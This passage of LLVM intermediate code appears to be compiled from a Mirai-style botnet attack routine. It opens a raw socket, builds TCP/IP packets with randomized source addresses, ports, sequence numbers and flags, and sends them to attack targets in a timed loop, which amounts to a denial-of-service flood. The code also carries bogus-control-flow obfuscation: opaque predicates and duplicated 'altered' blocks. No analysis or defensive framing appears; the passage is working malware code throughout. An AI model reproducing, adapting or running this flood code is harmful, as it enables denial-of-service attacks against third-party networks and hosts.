  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  %201 = load i16, i16* %23, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %24, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %25, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

; <label>:210:                                    ; preds = %163
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %210, %163
  %215 = load i32, i32* @x.23
  %216 = load i32, i32* @y.24
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %214
  %223 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 6
  store i8 6, i8* %224, align 1
  %225 = load i32, i32* %38, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 8
  store i32 %225, i32* %227, align 4
  %228 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %229 = load i32, i32* %19, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %228, i64 %230
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i32 0, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  %236 = load i16, i16* %26, align 2
  %237 = call zeroext i16 @htons(i16 zeroext %236) #7
  %238 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 0
  store i16 %237, i16* %239, align 4
  %240 = load i16, i16* %27, align 2
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 1
  store i16 %241, i16* %243, align 2
  %244 = load i32, i32* %28, align 4
  %245 = trunc i32 %244 to i16
  %246 = call zeroext i16 @htons(i16 zeroext %245) #7
  %247 = zext i16 %246 to i32
  %248 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 2
  store i32 %247, i32* %249, align 4
  %250 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = and i16 %252, -241
  %254 = or i16 %253, 80
  store i16 %254, i16* %251, align 4
  %255 = load i8, i8* %30, align 1
  %256 = sext i8 %255 to i16
  %257 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %258 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %257, i32 0, i32 4
  %259 = load i16, i16* %258, align 4
  %260 = and i16 %256, 1
  %261 = shl i16 %260, 13
  %262 = and i16 %259, -8193
  %263 = or i16 %262, %261
  store i16 %263, i16* %258, align 4
  %264 = load i8, i8* %31, align 1
  %265 = sext i8 %264 to i16
  %266 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 4
  %268 = load i16, i16* %267, align 4
  %269 = and i16 %265, 1
  %270 = shl i16 %269, 12
  %271 = and i16 %268, -4097
  %272 = or i16 %271, %270
  store i16 %272, i16* %267, align 4
  %273 = load i8, i8* %32, align 1
  %274 = sext i8 %273 to i16
  %275 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %276 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %275, i32 0, i32 4
  %277 = load i16, i16* %276, align 4
  %278 = and i16 %274, 1
  %279 = shl i16 %278, 11
  %280 = and i16 %277, -2049
  %281 = or i16 %280, %279
  store i16 %281, i16* %276, align 4
  %282 = load i8, i8* %33, align 1
  %283 = sext i8 %282 to i16
  %284 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %285 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %284, i32 0, i32 4
  %286 = load i16, i16* %285, align 4
  %287 = and i16 %283, 1
  %288 = shl i16 %287, 10
  %289 = and i16 %286, -1025
  %290 = or i16 %289, %288
  store i16 %290, i16* %285, align 4
  %291 = load i8, i8* %34, align 1
  %292 = sext i8 %291 to i16
  %293 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %294 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %293, i32 0, i32 4
  %295 = load i16, i16* %294, align 4
  %296 = and i16 %292, 1
  %297 = shl i16 %296, 9
  %298 = and i16 %295, -513
  %299 = or i16 %298, %297
  store i16 %299, i16* %294, align 4
  %300 = load i8, i8* %35, align 1
  %301 = sext i8 %300 to i16
  %302 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 4
  %304 = load i16, i16* %303, align 4
  %305 = and i16 %301, 1
  %306 = shl i16 %305, 8
  %307 = and i16 %304, -257
  %308 = or i16 %307, %306
  store i16 %308, i16* %303, align 4
  %309 = call i32 @rand_next()
  %310 = and i32 %309, 65535
  %311 = trunc i32 %310 to i16
  %312 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %313 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %312, i32 0, i32 5
  store i16 %311, i16* %313, align 2
  %314 = load i8, i8* %32, align 1
  %315 = icmp ne i8 %314, 0
  %316 = load i32, i32* @x.23
  %317 = load i32, i32* @y.24
  %318 = sub i32 %316, 1
  %319 = mul i32 %316, %318
  %320 = urem i32 %319, 2
  %321 = icmp eq i32 %320, 0
  %322 = icmp slt i32 %317, 10
  %323 = or i1 %321, %322
  br i1 %323, label %originalBBpart2224, label %originalBB7alteredBB

originalBBpart2224:                               ; preds = %originalBB7
  br i1 %315, label %324, label %330

; <label>:324:                                    ; preds = %originalBBpart2224
  %325 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %326 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %325, i32 0, i32 4
  %327 = load i16, i16* %326, align 4
  %328 = and i16 %327, -2049
  %329 = or i16 %328, 2048
  store i16 %329, i16* %326, align 4
  br label %330

; <label>:330:                                    ; preds = %324, %originalBBpart2224
  %331 = load i32, i32* @x.23
  %332 = load i32, i32* @y.24
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB226, label %originalBB226alteredBB

originalBB226:                                    ; preds = %originalBB226alteredBB, %330
  %339 = load i8*, i8** %42, align 8
  %340 = load i32, i32* %36, align 4
  call void @rand_alpha_str(i8* %339, i32 %340)
  %341 = load i8*, i8** %42, align 8
  %342 = load i32, i32* %36, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds i8, i8* %341, i64 %343
  store i8 0, i8* %344, align 1
  %345 = load i32, i32* @x.23
  %346 = load i32, i32* @y.24
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart2228, label %originalBB226alteredBB

originalBBpart2228:                               ; preds = %originalBB226
  br label %353

; <label>:353:                                    ; preds = %originalBBpart2228
  %354 = load i32, i32* @x.23
  %355 = load i32, i32* @y.24
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBB230, label %originalBB230alteredBB

originalBB230:                                    ; preds = %originalBB230alteredBB, %353
  %362 = load i32, i32* %19, align 4
  %363 = add nsw i32 %362, 1
  store i32 %363, i32* %19, align 4
  %364 = load i32, i32* @x.23
  %365 = load i32, i32* @y.24
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBBpart2236, label %originalBB230alteredBB

originalBBpart2236:                               ; preds = %originalBB230
  br label %158

; <label>:372:                                    ; preds = %158
  br label %373

; <label>:373:                                    ; preds = %589, %372
  store i32 0, i32* %19, align 4
  br label %374

; <label>:374:                                    ; preds = %580, %373
  %375 = load i32, i32* %19, align 4
  %376 = load i8, i8* %15, align 1
  %377 = zext i8 %376 to i32
  %378 = icmp slt i32 %375, %377
  br i1 %378, label %379, label %583

; <label>:379:                                    ; preds = %374
  %380 = load i8**, i8*** %21, align 8
  %381 = load i32, i32* %19, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds i8*, i8** %380, i64 %382
  %384 = load i8*, i8** %383, align 8
  store i8* %384, i8** %43, align 8
  %385 = load i8*, i8** %43, align 8
  %386 = bitcast i8* %385 to %struct.iphdr*
  store %struct.iphdr* %386, %struct.iphdr** %44, align 8
  %387 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i64 1
  %389 = bitcast %struct.iphdr* %388 to %struct.tcphdr*
  store %struct.tcphdr* %389, %struct.tcphdr** %45, align 8
  %390 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %391 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %390, i64 1
  %392 = bitcast %struct.tcphdr* %391 to i8*
  store i8* %392, i8** %46, align 8
  %393 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %394 = load i32, i32* %19, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i64 %395
  %397 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %396, i32 0, i32 2
  %398 = load i8, i8* %397, align 4
  %399 = zext i8 %398 to i32
  %400 = icmp slt i32 %399, 32
  br i1 %400, label %401, label %422

; <label>:401:                                    ; preds = %379
  %402 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %403 = load i32, i32* %19, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %402, i64 %404
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %405, i32 0, i32 1
  %407 = load i32, i32* %406, align 4
  %408 = call i32 @ntohl(i32 %407) #7
  %409 = call i32 @rand_next()
  %410 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %411 = load i32, i32* %19, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i64 %412
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %413, i32 0, i32 2
  %415 = load i8, i8* %414, align 4
  %416 = zext i8 %415 to i32
  %417 = lshr i32 %409, %416
  %418 = add i32 %408, %417
  %419 = call i32 @htonl(i32 %418) #7
  %420 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 9
  store i32 %419, i32* %421, align 4
  br label %422

; <label>:422:                                    ; preds = %401, %379
  %423 = load i32, i32* %38, align 4
  %424 = icmp eq i32 %423, -1
  br i1 %424, label %425, label %429

; <label>:425:                                    ; preds = %422
  %426 = call i32 @rand_next()
  %427 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 8
  store i32 %426, i32* %428, align 4
  br label %429

; <label>:429:                                    ; preds = %425, %422
  %430 = load i16, i16* %23, align 2
  %431 = zext i16 %430 to i32
  %432 = icmp eq i32 %431, 65535
  br i1 %432, label %433, label %439

; <label>:433:                                    ; preds = %429
  %434 = call i32 @rand_next()
  %435 = and i32 %434, 65535
  %436 = trunc i32 %435 to i16
  %437 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %438 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %437, i32 0, i32 3
  store i16 %436, i16* %438, align 4
  br label %439

; <label>:439:                                    ; preds = %433, %429
  %440 = load i16, i16* %26, align 2
  %441 = zext i16 %440 to i32
  %442 = icmp eq i32 %441, 65535
  br i1 %442, label %443, label %449

; <label>:443:                                    ; preds = %439
  %444 = call i32 @rand_next()
  %445 = and i32 %444, 65535
  %446 = trunc i32 %445 to i16
  %447 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %448 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %447, i32 0, i32 0
  store i16 %446, i16* %448, align 4
  br label %449

; <label>:449:                                    ; preds = %443, %439
  %450 = load i32, i32* @x.23
  %451 = load i32, i32* @y.24
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB238, label %originalBB238alteredBB

originalBB238:                                    ; preds = %originalBB238alteredBB, %449
  %458 = load i16, i16* %27, align 2
  %459 = zext i16 %458 to i32
  %460 = icmp eq i32 %459, 65535
  %461 = load i32, i32* @x.23
  %462 = load i32, i32* @y.24
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBBpart2240, label %originalBB238alteredBB

originalBBpart2240:                               ; preds = %originalBB238
  br i1 %460, label %469, label %475

; <label>:469:                                    ; preds = %originalBBpart2240
  %470 = call i32 @rand_next()
  %471 = and i32 %470, 65535
  %472 = trunc i32 %471 to i16
  %473 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %474 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %473, i32 0, i32 1
  store i16 %472, i16* %474, align 2
  br label %475

; <label>:475:                                    ; preds = %469, %originalBBpart2240
  %476 = load i32, i32* %28, align 4
  %477 = icmp eq i32 %476, 65535
  br i1 %477, label %478, label %498

; <label>:478:                                    ; preds = %475
  %479 = load i32, i32* @x.23
  %480 = load i32, i32* @y.24
  %481 = sub i32 %479, 1
  %482 = mul i32 %479, %481
  %483 = urem i32 %482, 2
  %484 = icmp eq i32 %483, 0
  %485 = icmp slt i32 %480, 10
  %486 = or i1 %484, %485
  br i1 %486, label %originalBB242, label %originalBB242alteredBB

originalBB242:                                    ; preds = %originalBB242alteredBB, %478
  %487 = call i32 @rand_next()
  %488 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %489 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %488, i32 0, i32 2
  store i32 %487, i32* %489, align 4
  %490 = load i32, i32* @x.23
  %491 = load i32, i32* @y.24
  %492 = sub i32 %490, 1
  %493 = mul i32 %490, %492
  %494 = urem i32 %493, 2
  %495 = icmp eq i32 %494, 0
  %496 = icmp slt i32 %491, 10
  %497 = or i1 %495, %496
  br i1 %497, label %originalBBpart2244, label %originalBB242alteredBB

originalBBpart2244:                               ; preds = %originalBB242
  br label %498

; <label>:498:                                    ; preds = %originalBBpart2244, %475
  %499 = load i32, i32* %29, align 4
  %500 = icmp eq i32 %499, 65535
  br i1 %500, label %501, label %505

; <label>:501:                                    ; preds = %498
  %502 = call i32 @rand_next()
  %503 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %504 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %503, i32 0, i32 3
  store i32 %502, i32* %504, align 4
  br label %505

; <label>:505:                                    ; preds = %501, %498
  %506 = load i8, i8* %37, align 1
  %507 = icmp ne i8 %506, 0
  br i1 %507, label %508, label %531

; <label>:508:                                    ; preds = %505
  %509 = load i32, i32* @x.23
  %510 = load i32, i32* @y.24
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB246, label %originalBB246alteredBB

originalBB246:                                    ; preds = %originalBB246alteredBB, %508
  %517 = load i8*, i8** %46, align 8
  %518 = load i32, i32* %36, align 4
  call void @rand_alpha_str(i8* %517, i32 %518)
  %519 = load i8*, i8** %46, align 8
  %520 = load i32, i32* %36, align 4
  %521 = sext i32 %520 to i64
  %522 = getelementptr inbounds i8, i8* %519, i64 %521
  store i8 0, i8* %522, align 1
  %523 = load i32, i32* @x.23
  %524 = load i32, i32* @y.24
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
  %529 = icmp slt i32 %524, 10
  %530 = or i1 %528, %529
  br i1 %530, label %originalBBpart2248, label %originalBB246alteredBB

originalBBpart2248:                               ; preds = %originalBB246
  br label %531

; <label>:531:                                    ; preds = %originalBBpart2248, %505
  %532 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 0, i16* %533, align 2
  %534 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %535 = bitcast %struct.iphdr* %534 to i16*
  %536 = call zeroext i16 @checksum_generic(i16* %535, i32 20)
  %537 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  %539 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %540 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %539, i32 0, i32 6
  store i16 0, i16* %540, align 4
  %541 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %542 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %543 = bitcast %struct.tcphdr* %542 to i8*
  %544 = load i32, i32* %36, align 4
  %545 = sext i32 %544 to i64
  %546 = add i64 20, %545
  %547 = trunc i64 %546 to i16
  %548 = call zeroext i16 @htons(i16 zeroext %547) #7
  %549 = load i32, i32* %36, align 4
  %550 = sext i32 %549 to i64
  %551 = add i64 20, %550
  %552 = trunc i64 %551 to i32
  %553 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %541, i8* %543, i16 zeroext %548, i32 %552)
  %554 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 6
  store i16 %553, i16* %555, align 4
  %556 = load %struct.tcphdr*, %struct.tcphdr** %45, align 8
  %557 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %556, i32 0, i32 1
  %558 = load i16, i16* %557, align 2
  %559 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %560 = load i32, i32* %19, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i64 %561
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i32 0, i32 0
  %564 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %563, i32 0, i32 1
  store i16 %558, i16* %564, align 2
  %565 = load i32, i32* %20, align 4
  %566 = load i8*, i8** %43, align 8
  %567 = load i32, i32* %36, align 4
  %568 = sext i32 %567 to i64
  %569 = add i64 40, %568
  %570 = bitcast %union.__CONST_SOCKADDR_ARG* %47 to %struct.sockaddr**
  %571 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %572 = load i32, i32* %19, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i64 %573
  %575 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %574, i32 0, i32 0
  %576 = bitcast %struct.sockaddr_in* %575 to %struct.sockaddr*
  store %struct.sockaddr* %576, %struct.sockaddr** %570, align 8
  %577 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %47, i32 0, i32 0
  %578 = load %struct.sockaddr*, %struct.sockaddr** %577, align 8
  %579 = call i64 @sendto(i32 %565, i8* %566, i64 %569, i32 16384, %struct.sockaddr* %578, i32 16)
  br label %580

; <label>:580:                                    ; preds = %531
  %581 = load i32, i32* %19, align 4
  %582 = add nsw i32 %581, 1
  store i32 %582, i32* %19, align 4
  br label %374

; <label>:583:                                    ; preds = %374
  %584 = call i64 @time(i64* null) #6
  %585 = load i32, i32* %39, align 4
  %586 = sext i32 %585 to i64
  %587 = icmp sgt i64 %584, %586
  br i1 %587, label %588, label %589

; <label>:588:                                    ; preds = %583
  br label %590

; <label>:589:                                    ; preds = %583
  br label %373

; <label>:590:                                    ; preds = %588, %originalBBpart25, %132
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %591 = alloca i32, align 4
  %592 = alloca i8, align 1
  %593 = alloca %struct.attack_target*, align 8
  %594 = alloca i8, align 1
  %595 = alloca %struct.attack_option*, align 8
  %596 = alloca i32, align 4
  %597 = alloca i32, align 4
  %598 = alloca i8**, align 8
  %599 = alloca i8, align 1
  %600 = alloca i16, align 2
  %601 = alloca i8, align 1
  %602 = alloca i8, align 1
  %603 = alloca i16, align 2
  %604 = alloca i16, align 2
  %605 = alloca i32, align 4
  %606 = alloca i32, align 4
  %607 = alloca i8, align 1
  %608 = alloca i8, align 1
  %609 = alloca i8, align 1
  %610 = alloca i8, align 1
  %611 = alloca i8, align 1
  %612 = alloca i8, align 1
  %613 = alloca i32, align 4
  %614 = alloca i8, align 1
  %615 = alloca i32, align 4
  %616 = alloca i32, align 4
  %617 = alloca %struct.iphdr*, align 8
  %618 = alloca %struct.tcphdr*, align 8
  %619 = alloca i8*, align 8
  %620 = alloca i8*, align 8
  %621 = alloca %struct.iphdr*, align 8
  %622 = alloca %struct.tcphdr*, align 8
  %623 = alloca i8*, align 8
  %624 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %591, align 4
  store i8 %1, i8* %592, align 1
  store %struct.attack_target* %2, %struct.attack_target** %593, align 8
  store i8 %3, i8* %594, align 1
  store %struct.attack_option* %4, %struct.attack_option** %595, align 8
  store i32 0, i32* %596, align 4
  store i32 0, i32* %597, align 4
  %625 = load i8, i8* %592, align 1
  %626 = zext i8 %625 to i64
  %627 = call noalias i8* @calloc(i64 %626, i64 8) #6
  %628 = bitcast i8* %627 to i8**
  store i8** %628, i8*** %598, align 8
  %629 = load i8, i8* %594, align 1
  %630 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %631 = call i32 @attack_get_opt_int(i8 zeroext %629, %struct.attack_option* %630, i8 zeroext 2, i32 0)
  %632 = trunc i32 %631 to i8
  store i8 %632, i8* %599, align 1
  %633 = load i8, i8* %594, align 1
  %634 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %635 = call i32 @attack_get_opt_int(i8 zeroext %633, %struct.attack_option* %634, i8 zeroext 3, i32 65535)
  %636 = trunc i32 %635 to i16
  store i16 %636, i16* %600, align 2
  %637 = load i8, i8* %594, align 1
  %638 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %639 = call i32 @attack_get_opt_int(i8 zeroext %637, %struct.attack_option* %638, i8 zeroext 4, i32 64)
  %640 = trunc i32 %639 to i8
  store i8 %640, i8* %601, align 1
  %641 = load i8, i8* %594, align 1
  %642 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %643 = call i32 @attack_get_opt_int(i8 zeroext %641, %struct.attack_option* %642, i8 zeroext 5, i32 0)
  %644 = trunc i32 %643 to i8
  store i8 %644, i8* %602, align 1
  %645 = load i8, i8* %594, align 1
  %646 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %647 = call i32 @attack_get_opt_int(i8 zeroext %645, %struct.attack_option* %646, i8 zeroext 6, i32 65535)
  %648 = trunc i32 %647 to i16
  store i16 %648, i16* %603, align 2
  %649 = load i8, i8* %594, align 1
  %650 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %651 = call i32 @attack_get_opt_int(i8 zeroext %649, %struct.attack_option* %650, i8 zeroext 7, i32 65535)
  %652 = trunc i32 %651 to i16
  store i16 %652, i16* %604, align 2
  %653 = load i8, i8* %594, align 1
  %654 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %655 = call i32 @attack_get_opt_int(i8 zeroext %653, %struct.attack_option* %654, i8 zeroext 16, i32 65535)
  store i32 %655, i32* %605, align 4
  %656 = load i8, i8* %594, align 1
  %657 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %658 = call i32 @attack_get_opt_int(i8 zeroext %656, %struct.attack_option* %657, i8 zeroext 17, i32 65535)
  store i32 %658, i32* %606, align 4
  %659 = load i8, i8* %594, align 1
  %660 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %661 = call i32 @attack_get_opt_int(i8 zeroext %659, %struct.attack_option* %660, i8 zeroext 10, i32 0)
  %662 = trunc i32 %661 to i8
  store i8 %662, i8* %607, align 1
  %663 = load i8, i8* %594, align 1
  %664 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %665 = call i32 @attack_get_opt_int(i8 zeroext %663, %struct.attack_option* %664, i8 zeroext 11, i32 1)
  %666 = trunc i32 %665 to i8
  store i8 %666, i8* %608, align 1
  %667 = load i8, i8* %594, align 1
  %668 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %669 = call i32 @attack_get_opt_int(i8 zeroext %667, %struct.attack_option* %668, i8 zeroext 12, i32 0)
  %670 = trunc i32 %669 to i8
  store i8 %670, i8* %609, align 1
  %671 = load i8, i8* %594, align 1
  %672 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %673 = call i32 @attack_get_opt_int(i8 zeroext %671, %struct.attack_option* %672, i8 zeroext 13, i32 0)
  %674 = trunc i32 %673 to i8
  store i8 %674, i8* %610, align 1
  %675 = load i8, i8* %594, align 1
  %676 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %677 = call i32 @attack_get_opt_int(i8 zeroext %675, %struct.attack_option* %676, i8 zeroext 14, i32 0)
  %678 = trunc i32 %677 to i8
  store i8 %678, i8* %611, align 1
  %679 = load i8, i8* %594, align 1
  %680 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %681 = call i32 @attack_get_opt_int(i8 zeroext %679, %struct.attack_option* %680, i8 zeroext 15, i32 0)
  %682 = trunc i32 %681 to i8
  store i8 %682, i8* %612, align 1
  %683 = load i8, i8* %594, align 1
  %684 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %685 = call i32 @attack_get_opt_int(i8 zeroext %683, %struct.attack_option* %684, i8 zeroext 0, i32 512)
  store i32 %685, i32* %613, align 4
  %686 = load i8, i8* %594, align 1
  %687 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %688 = call i32 @attack_get_opt_int(i8 zeroext %686, %struct.attack_option* %687, i8 zeroext 1, i32 1)
  %689 = trunc i32 %688 to i8
  store i8 %689, i8* %614, align 1
  %690 = load i8, i8* %594, align 1
  %691 = load %struct.attack_option*, %struct.attack_option** %595, align 8
  %692 = load i32, i32* @LOCAL_ADDR, align 4
  %693 = call i32 @attack_get_opt_ip(i8 zeroext %690, %struct.attack_option* %691, i8 zeroext 19, i32 %692)
  store i32 %693, i32* %615, align 4
  %694 = call i64 @time(i64* null) #6
  %695 = load i32, i32* %591, align 4
  %696 = sext i32 %695 to i64
  %_ = sub i64 %694, %696
  %gen = mul i64 %_, %696
  %_1 = sub i64 0, %694
  %gen2 = add i64 %_1, %696
  %697 = add nsw i64 %694, %696
  %698 = trunc i64 %697 to i32
  store i32 %698, i32* %616, align 4
  %699 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %699, i32* %597, align 4
  %700 = icmp eq i32 %699, -1
  br label %originalBB

originalBB3alteredBB:                             ; preds = %originalBB3, %138
  %701 = load i32, i32* %20, align 4
  %702 = call i32 @close(i32 %701)
  br label %originalBB3

originalBB7alteredBB:                             ; preds = %originalBB7, %214
  %703 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %704 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %703, i32 0, i32 6
  store i8 6, i8* %704, align 1
  %705 = load i32, i32* %38, align 4
  %706 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %707 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %706, i32 0, i32 8
  store i32 %705, i32* %707, align 4
  %708 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %709 = load i32, i32* %19, align 4
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %708, i64 %710
